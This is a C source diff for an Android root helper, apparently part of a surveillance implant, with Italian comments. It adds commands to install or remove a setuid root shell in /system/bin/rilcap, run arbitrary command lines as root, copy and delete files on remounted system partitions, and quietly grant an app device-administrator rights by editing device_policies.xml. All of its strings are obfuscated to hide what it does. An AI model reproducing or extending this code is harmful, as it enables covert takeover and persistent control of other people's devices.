@@ -31,21 +31,23 @@
 
 #ifdef DEBUG
 #warning "Debug mode is enabled, errors will be printed to stdout"
-#define LOG(x)  printf(x)
+#define LOG(fmt, ...) printf(fmt, ##__VA_ARGS__)
 #else
-#define LOG(x) ;
+#define LOG(fmt, ...) ;
 #endif
 
 static int copy(const char *from, const char *to);
-unsigned int getProcessId(const char *p_processname);
-int setgod();
-void sync_reboot();
-int remount(const char *mntpoint, int flags);
-int my_mount(const char *mntpoint);
-void my_chown(const char *user, const char *group, const char *file);
-void my_chmod(const char *mode, const char *file);
-void add_admin(const char *appname);
+static int log_to_file(const char *full_path, const char *content, const int len);
+static unsigned int getProcessId(const char *p_processname);
+static int setgod();
+static void sync_reboot();
+static int remount(const char *mntpoint, int flags);
+static int my_mount(const char *mntpoint);
+static void my_chown(const char *user, const char *group, const char *file);
+static void my_chmod(const char *mode, const char *file);
+static void add_admin(const char *appname);
 static void copy_root(const char *mntpnt, const char *dst);
+static void copy_remount(const char *mntpnt, const char *src, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
 //static int get_framebuffer(char *filename);
 static unsigned char* deobfuscate(unsigned char *s);
@@ -81,13 +83,16 @@ int main(int argc, char** argv) {
 	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
 	unsigned char adm[] = "\x5b\x25\x7d\x7a\x41\x7e"; // "adm"
 	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
-	
+	unsigned char lid[] = "\xb2\xf9\x48\x2e\x2d\x36"; // "lid"
+	unsigned char rf[] = "\xf9\x6f\x94\x95\x61"; // "rf"
+	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
+
 	int i;
 	unsigned char *da, *db;
 	
 	if (argc < 2) {
 		LOG("Usage: ");
-		LOG(argv[0]);
+		LOG("%s", argv[0]);
 		LOG(" <command>\n");
 		LOG("fb - try to capture a screen snapshot\n");
 		LOG("vol - kill VOLD twice\n");
@@ -96,14 +101,17 @@ int main(int argc, char** argv) {
 		LOG("blw - mount /system in READ_WRITE\n");
 		LOG("rt - install the root shell in /system/bin/rilcap\n");
 		LOG("ru - remove the root shell from /system/bin/rilcap\n");
+		LOG("rf <mntpoint> <file> - remove <file> from <mntpoint>");
 		LOG("sd - mount /sdcard\n");
 		LOG("air - check if the shell has root privileges\n");
 		LOG("qzx \"command\" - execute the given commandline\n");
-		LOG("fhc <src> <dest> - copy <src> into <dst>\n");
+		LOG("fhc <src> <dest> - copy <src> to <dst>\n");
+		LOG("fhs <mntpoint> <src> <dest> - copy <src> to <dst> on mountpoint <mntpoint>\n");
 		LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
 		LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
 		LOG("adm <package name/receiver>\n");
 		LOG("qzs - start a root shell\n");
+		LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
 		
 		return 0;
 	}
@@ -146,6 +154,9 @@ int main(int argc, char** argv) {
 	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/rilcap
 		LOG("Removing suid shell\n");
 		delete_root(deobfuscate(system4), deobfuscate(rilcap2));
+	} else if (strcmp(argv[1], deobfuscate(rf)) == 0) {  // Cancella un file dal filesystem
+		LOG("Removing %s from %s\n", argv[3], argv[2]);
+		delete_root(argv[2], argv[3]);
 	} else if (strcmp(argv[1], deobfuscate(sd)) == 0) {  // Mount /sdcard
 		LOG("Mounting /sdcard\n");
 		my_mount(deobfuscate(mntsdcard));
@@ -153,23 +164,34 @@ int main(int argc, char** argv) {
 		LOG("Are we root?\n");
 		return setgod();
 	} else if (strcmp(argv[1], deobfuscate(qzx)) == 0) { // Eseguiamo la riga passataci
-		LOG("Executing provided command\n");
+		LOG("Executing \"%s\"\n", argv[2]);
 		return system(argv[2]);
 	} else if (strcmp(argv[1], deobfuscate(fhc)) == 0) { // Copiamo un file nel path specificato dal secondo argomento 
-		LOG("Copying file to destination folder\n");
+		LOG("Copying file %s to %s\n", argv[2], argv[3]);
 		copy(argv[2], argv[3]);
 		return 0;
+	} else if (strcmp(argv[1], deobfuscate(fhs)) == 0) { // Copiamo un file nel path specificato dal secondo argomento (con remount del mntpoint)
+		LOG("Copying file %s to %s on mountpoint %s\n", argv[3], argv[4], argv[2]);
+		copy_remount(argv[2], argv[3], argv[4]);
+		return 0;
 	} else if (strcmp(argv[1], deobfuscate(fho)) == 0) { // chown: user group file
-		LOG("Chowning file\n");
+		LOG("Chowning to %s:%s file %s\n", argv[2], argv[3], argv[4]);
 		my_chown(argv[2], argv[3], argv[4]);
 		return 0;
 	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
-		LOG("Chmodding file\n");
+		LOG("Chmodding to %s file %s\n", argv[2], argv[3]);
 		my_chmod(argv[2], argv[3]);
 		return 0;
 	} else if (strcmp(argv[1], deobfuscate(adm)) == 0) { // Add the application to the admin list
-		LOG("Adding the app to Administrators list\n");
+		LOG("Adding the app %s to Administrators list\n", argv[2]);
 		add_admin(argv[2]);
+		return 0;
+	} else if (strcmp(argv[1], deobfuscate(lid)) == 0) { // Write pid of a process to file
+		LOG("Returning process ID for %s to %s\n", argv[2], argv[3]);
+		i = getProcessId(argv[2]);
+
+		LOG("Process id is: %d\n", i);
+		log_to_file(argv[3], (char *)&i, sizeof(int));
 		return 0;
 	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
 		const char * shell = deobfuscate(binsh1);
@@ -196,7 +218,7 @@ int main(int argc, char** argv) {
 // Al momento le free() non vengono MAI chiamate perche' tutti i comandi sono one-shot
 // E' zozza ma almeno non triplichiamo tutte le righe di codice e cmq il processo non
 // resta mai attivo.
-unsigned char* deobfuscate(unsigned char *s) {
+static unsigned char* deobfuscate(unsigned char *s) {
     unsigned char key, mod, len;
     int i, j;
 	unsigned char* d;
@@ -296,7 +318,33 @@ unsigned char* deobfuscate(unsigned char *s) {
 	return fd;
 }*/
 
-void my_chmod(const char *mode, const char *file) {
+static int log_to_file(const char *full_path, const char *content, const int len) {
+	int fd, ret;
+
+	if ((fd = open(full_path, O_CREAT | O_TRUNC | O_WRONLY)) < 0) {
+		LOG("Unable to create %s\n", full_path);
+		return -1;
+	}
+
+	ret = write(fd, content, (size_t)len);
+
+	if (ret < 0) {
+		LOG("Error writing to file\n");
+		close(fd);
+		return -1;
+	}
+
+	if (ret < len) {
+		LOG("Written %d bytes to file instead of %d bytes\n", ret, len);
+	}
+
+	close(fd);
+	chmod(full_path, 0666);
+
+	return 1;
+}
+
+static void my_chmod(const char *mode, const char *file) {
 	unsigned char o[] = "\xa0\xf6\x54\x8d\x33"; // "%o"
 	
 	int newmode;
@@ -305,7 +353,7 @@ void my_chmod(const char *mode, const char *file) {
 	chmod(file, newmode);
 }
 
-void my_chown(const char *user, const char *group, const char *file) {
+static void my_chown(const char *user, const char *group, const char *file) {
 	unsigned char chown1[] = "\x5a\x44\x0c\xfd\x29\x23\x29\x36\xc7\x3f\xfd\x38\x33\x3c\xfd\x39\x32\x3d\x35\x3c\xfa"; // "/system/bin/chown "
 	unsigned char chown2[] = "\x38\x07\x25\x19\x55\x4f\x55\x54\x63\x5b\x19\x66\x5f\x5a\x19\x65\x50\x59\x51\x5a\x18\x23\x55\x1a\x23\x55\x18\x23\x55"; // "/system/bin/chown %s.%s %s"
 	
@@ -336,8 +384,6 @@ static void delete_root(const char *mntpnt, const char *dst) {
 
 	if (mntpnt != NULL)
 		remount(mntpnt, MS_RDONLY);
-		
-	LOG("Suid shell removed\n");
 }
 
 static void copy_root(const char *mntpnt, const char *dst) {
@@ -349,6 +395,17 @@ static void copy_root(const char *mntpnt, const char *dst) {
 	copy(deobfuscate(exe), dst);
 	chown(dst, 0, 0);
 	chmod(dst, 04755);
+
+	if (mntpnt != NULL)
+		remount(mntpnt, MS_RDONLY);
+}
+
+static void copy_remount(const char *mntpnt, const char *src, const char *dst) {
+	if (mntpnt != NULL)
+		remount(mntpnt, 0);
+
+	copy(src, dst);
+	chown(dst, 0, 0);
 
 	if (mntpnt != NULL)
 		remount(mntpnt, MS_RDONLY);
@@ -389,7 +446,7 @@ static int copy(const char *from, const char *to) {
 	return r;
 }
 
-unsigned int getProcessId(const char *p_processname) {
+static unsigned int getProcessId(const char *p_processname) {
 	unsigned char proc1[] = "\xa4\x08\xaa\x9b\xd4\xd6\xdb\xc7\x9b"; // "/proc/"
 	unsigned char numbers[] = "\x7d\x9b\xec\x73\x7c\x71\x72\x7f\x78\x7d\x7e\x7b\x44"; // "0123456789"
 	unsigned char proc2[] = "\x2f\xe1\xc8\x00\xa1\xdf\xc0\xcc\x00"; // "/proc/"
@@ -405,10 +462,6 @@ unsigned int getProcessId(const char *p_processname) {
     int errorcount;
     int result;
 	
-#ifdef DEBUG
-    char msg[256];
-#endif
-
     errorcount = 0;
     result = 0;
 
@@ -430,13 +483,9 @@ unsigned int getProcessId(const char *p_processname) {
 
                 if (strstr(target_name, p_processname) != NULL) {
                     result = atoi(dir_entry_p->d_name);
-
-#ifdef DEBUG
-                    sprintf(msg, "getProcessID(%s) id = %d\n", p_processname, result);
-                    LOG(msg);
-#endif
-
                     closedir(dir_p);
+
+                    LOG("getProcessID(%s) id = %d\n", p_processname, result);
                     return result;
                 }
             }
@@ -445,30 +494,20 @@ unsigned int getProcessId(const char *p_processname) {
 
     closedir(dir_p);
 
-#ifdef DEBUG
-    sprintf(msg, "getProcessID(%s) id = 0 (could not find process)\n", p_processname);
-    LOG(msg);
-#endif
+    LOG("getProcessID(%s) id = 0 (could not find process)\n", p_processname);
 
     return result;
 }
 
-void sync_reboot() {
-#ifdef DEBUG
-	char buf[256];
-#endif
-
+static void sync_reboot() {
 	sync();
 
 	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
-#ifdef DEBUG
-		sprintf(buf, "Error rebooting: %d\n", errno);
-		LOG(buf);
-#endif
+		LOG("Error rebooting: %d\n", errno);
 	}
 }
 
-int remount(const char *mntpoint, int flags) {
+static int remount(const char *mntpoint, int flags) {
 	unsigned char mounts[] = "\x84\xe0\x68\x6b\x34\x36\x2b\x27\x6b\x29\x2b\x31\x2a\x30\x37"; // "/proc/mounts"
 	unsigned char r[] = "\x19\xfe\xe6\x97"; // "r"
 	unsigned char t1[] = "\x39\x8e\xb5\x29\x30"; // " \t"
@@ -499,9 +538,7 @@ int remount(const char *mntpoint, int flags) {
     fclose(f);
 
     if (!found) {
-		LOG("Cannot find mountpoint: ");
-		LOG(mntpoint);
-		LOG("\n");
+		LOG("Cannot find mountpoint: %s\n", mntpoint);
 		
         return -1;
     }
@@ -524,7 +561,7 @@ int remount(const char *mntpoint, int flags) {
     return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
 }
 
-int my_mount(const char *mntpoint) {
+static int my_mount(const char *mntpoint) {
 	unsigned char t1[] = "\x77\xe9\x9c\xa9\x8e"; // " \t"
 	unsigned char t2[] = "\xab\xbd\x14\xf5\xe2"; // " \t"
 	unsigned char t3[] = "\x95\xc1\x56\xb7\x9c"; // " \t"
@@ -577,7 +614,7 @@ int my_mount(const char *mntpoint) {
     return mount(dev, mntpoint, fstype, 0, 0);
 }
 
-void add_admin(const char *appname) {
+static void add_admin(const char *appname) {
 	unsigned char pfile[] = "\x6e\xaa\xe4\x41\x1e\x13\x6e\x13\x41\x6d\x6b\x6d\x6e\x1f\x07\x41\x1e\x1f\x68\x1b\x1d\x1f\x71\x62\x01\x06\x1b\x1d\x1b\x1f\x6d\x40\x6a\x07\x06"; // "/data/system/device_policies.xml"
 	unsigned char policies[] = "\xf0\x99\x63\xfc\x80\xa1\xac\xab\xb5\xab\xb7\x85\xfe"; // "<policies>"
 	unsigned char cpolicies[] = "\xaa\x7a\xdc\x6a\x2e\x45\x3a\x47\x39\x47\x33\x29\x7e\x85\x74"; // "<policies />"
@@ -669,23 +706,13 @@ void add_admin(const char *appname) {
 }
 
 
-int setgod() {
-#ifdef DEBUG
-    char buf[256];
-    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
-	//LOG("Getting root privileges\n");
-	//LOG(buf);
-#endif
-
+static int setgod() {
     setegid(0);
     setuid(0);
     setgid(0);
     seteuid(0);
 
-#ifdef DEBUG
-    sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
-	LOG(buf);
-#endif
+    LOG("Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
 
     return (seteuid(0) == 0) ? 1 : 0;
 }
